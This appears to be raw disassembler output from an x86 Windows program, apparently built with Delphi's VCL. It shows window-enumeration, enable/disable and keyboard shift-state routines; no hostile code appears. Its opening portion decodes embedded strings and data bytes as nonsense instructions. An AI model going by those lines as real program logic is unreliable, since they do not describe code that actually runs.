add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
lea eax [ eax ]
je r-xdata
inc esi
outsd
jb r-xdata
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
jae r-xdata
insd
outsd
inc ebp
add al cl
mov [ ebx ] 0xe8
add al dl
jl r-xdata
cwde
inc ecx
add [ ebp + ecx + 0xf580045 ] ah
inc ebp
add [ esp + esi + 0x33c40040 ] bl
inc ebp
add al dh
xor [ eax ] eax
add al dl
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
inc ecx
add [ eax + 0x1b ] al
inc ebp
add [ ebp + edx * 4 + 0x56e00041 ] dh
inc ebp
add [ eax ] bl
or al 0x45
add [ eax + edi * 8 + 0x43 ] dl
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add [ eax ] ah
sbb [ ebp ] al
or al dh
inc ebx
add ah cl
jl r-xdata
add al ch
cwde
add al bh
add al [ eax ]
add [ eax + ebx * 8 + 0x44 ] dl
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl bl
fild [ eax + eax + 0x4a ]
loope r-xdata
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
push 0x9646c69
jae r-xdata
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
inc esp
or [ eax + edx * 2 + 0x6f ] edx
fild [ eax + eax + 0x3 ]
jae r-xdata
inc ebp
add [ eax + 0x32 ] cl
inc ebp
add [ ecx + esi ] al
inc ebp
add [ eax - 0x39 ] ah
inc ebx
add al ch
add [ ecx + ebx ] dl
inc ebp
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
or al 0x32
inc eax
add al al
cmovne eax [ eax ]
inc eax
std
inc ebx
add [ eax ] dh
adc eax 0x3d500045
inc ecx
pop eax
cmovne eax [ eax ]
pushfd
xor al 0x40
add ah al
xor eax [ ebp ]
[ eax ] eax
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
and dh bl
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ eax - 0x3bffbacd ] al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ edx + edi + 0x45 ] dh
add [ eax ] dh
add al 0x44
add [ eax - 0x77ffbc12 ] bh
dec edi
inc ebp
add [ eax + 0x7bc0045 ] cl
inc ebp
add [ eax + 0x40 ] ch
inc ebp
add [ eax + edx + 0x11200045 ] ah
inc ebp
add [ eax + 0x53 ] ch
inc ebp
add ah bl
or eax 0x4e6c0045
inc ebp
add [ ebp + esi + 0x45 ] cl
add [ eax ] ah
push eax
inc ebp
add [ ebx + ebx ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov esp 0x500044da
add al [ eax ]
add al dh
fiadd [ eax + eax + 0x64 ]
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ ecx + ecx * 4 + 0x1b080043 ] bl
inc ebp
add ah dl
sbb [ ebp ] eax
aam 0x8a
inc ebx
add [ eax + 0x7c00451b ] al
lodsd [ esi ]
inc ebx
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
fld [ eax + eax + 0x8 ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44e352
cmp al 0x58
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
push eax
pop eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
dec [ eax - 0xd ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
fiadd [ eax + eax + 0x29 ]
add al [ eax ]
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov eax [ fs : ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0xdbc06564
inc esp
add [ eax ] ch
add al [ eax ]
push [ eax - 0x57ffbadd ]
inc ebp
add [ eax ] al
outsd
inc eax
cmp eax [ ebx ]
popad
add [ eax ] al
call [ ebp + edi * 2 + 0x7e300043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
cld
insb
mov eax 0x6c004349
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
mov al 0x23
inc ebp
add [ eax + 0x4526 ] ch
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ eax + 0x6 ]
popad
outsb
jae r-xdata
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add bh bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
add [ edi + edx + 0x45 ] dl
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
call 0x7943e532
pop eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
sbb [ ebp ] eax
push esp
pop ss
inc ebp
imul ebp [ edi + 0x6e ] r-xdata
mov [ ebx + eax * 2 + 0x451a2c00 ] al
add [ edi + edx + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ esp + eax * 4 + 0x43 ] al
add ah bh
jae r-xdata
arpl [ edi + 0x6e ] bp
push ebp
jae r-xdata
popad
jb r-xdata
inc eax
mov al [ ebx ]
jo r-xdata
inc ebx
add ah bh
mov eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
add bh bh
inc ebx
add [ eax + 0x4526 ] ch
add [ eax ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x4300ffff ] ah
hlt
push 0x8c0043f3
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
outsb
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
fadd [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
[ eax + 0x4526 ]
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
add al 0xde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pushfd
cmp al [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add ah ch
add al [ eax ]
jmp [ eax + ebx * 2 + 0x45 ]
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
call 0x744528c2
add [ eax ] al
call [ edi + ebp * 4 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add [ eax + 0x1 ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x68ff0001 ] ah
inc ebx
add [ ebx + esi * 8 + 0x43 ] cl
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp al [ ebx ]
outsd
outsb
sub_44f06c
mov edi 0x9cffbdff
pop edx
inc ebp
add ah al
pop edx
inc ebp
add [ ebx + ebx * 2 + 0x45 ] bl
add [ ebx + ebx * 2 + 0x5c880045 ] dh
inc ebp
add [ eax + 0x2000455c ] ah
pop ecx
inc ebp
add [ edx + ebx * 2 ] al
inc ebp
add [ eax + 0x5a ] dh
inc ebp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
int1
je r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
xchg edx eax
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
inc esp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ eax ] al
add [ eax - 0xf ] al
test al 0xf0
inc esp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffbb0e ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
inc esp
add [ eax + 0x1 ] al
add [ eax ] al
js r-xdata
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ esi + edi ] dh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ eax + 0xe00456e ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
inc ebp
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + esi * 2 + 0x45 ] dh
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
inc eax
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
push 0x580044ef
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add ah dh
sub [ ebp ] eax
or [ edx ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x9800408d
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
int1
inc esp
add al ch
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
int1
inc esp
add [ eax + 0x78000000 ] ah
and [ ecx ] al
rcr [ eax + 0x34940041 ] 0x1
inc eax
add [ eax ] dl
xchg edx eax
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add ah bh
pop esi
inc ebp
add [ esi + edi ] dh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ ebp + ebx * 2 + 0xe0045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
call 0x74536da
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
cwde
int1
inc esp
add [ ecx + 0x41 ] dh
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
arpl [ eax - 0x70 ] bp
inc eax
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44f31c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44f368
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458a70
mov eax [ rw-data ]
call sub_4193ec
mov eax [ rw-data ]
call sub_419394
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44f3a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44f3f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44f493
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44f45c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44f3a0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f49a
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44f4a4
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44f4dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44f540
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44f4dc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44f59c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44f5bc
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44f59c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44f5e8
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_456050
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4564c0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b34
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45603c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4564ac
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b34
test eax eax
je r-xdata
sub_44f670
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44f6c4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44f700
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44f74c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f7aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d300
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404178
mov eax [ ebp - 0x8 ]
pop edx
call sub_407b34
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7b1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_44f7bc
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44f7e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44f855
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44f7bc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f85c
lea eax [ ebp - 0xc ]
call sub_403f90
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
sub_44f864
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_44f8f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413d50
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4501bc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45019c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45004c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f944
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44fafc
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4390b4
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45004c
xor edx edx
mov eax ebx
call sub_45004c
jmp r-xdata
sub_44f97c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421f0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44f9e8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421f0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44fa50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_450184
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_450184
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43bf1c
call sub_44f9e8
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
